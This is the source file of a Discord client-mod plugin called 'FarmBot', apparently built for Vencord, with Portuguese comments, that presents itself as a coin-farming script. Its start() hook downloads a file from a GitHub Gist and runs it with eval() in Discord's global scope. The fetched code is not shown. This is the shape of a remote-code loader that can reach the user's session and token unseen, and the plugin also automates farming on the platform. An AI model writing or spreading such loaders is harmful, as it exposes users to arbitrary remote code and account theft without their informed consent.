/*
 * Vencord, a Discord client mod
 * Copyright (c) 2026 Vendicated and contributors
 * SPDX-License-Identifier: GPL-3.0-or-later
 */

import definePlugin from "@utils/types";

export default definePlugin({
    name: "FarmBot",
    description: "Executa o script da farm de moedas.",
    authors: [{ name: "gecko", id: 2648308372777205n }],

    start() {
        console.log("[FarmBot] Iniciando carregamento do script do Gist...");
        fetch("https://api.github.com/gists/47f10e8cf69704b1d41d7ee14d9c2573")
            .then(res => {
                if (!res.ok) throw new Error("Falha ao baixar o script: " + res.statusText);
                return res.json();
            })
            .then(data => {
                const code = data.files["farm.js"].content;
                // Executa o script baixado diretamente no escopo global do Discord
                eval(code);
                console.log("[FarmBot] Script de farm carregado e executado com sucesso!");
            })
            .catch(err => {
                console.error("[FarmBot] Erro ao carregar o script de farm:", err);
            });
    },

    stop() {
        console.log("[FarmBot] Desativando plugin. Para limpar completamente o HUD, reinicie o Discord (Ctrl + R).");
        document.getElementById("farm-styles")?.remove();
        document.getElementById("farm-tooltip")?.remove();
        document.getElementById("farm-dashboard-menu")?.remove();
        document.getElementById("farm-server-error-overlay")?.remove();
        document.getElementById("farm-update-overlay")?.remove();
    }
});
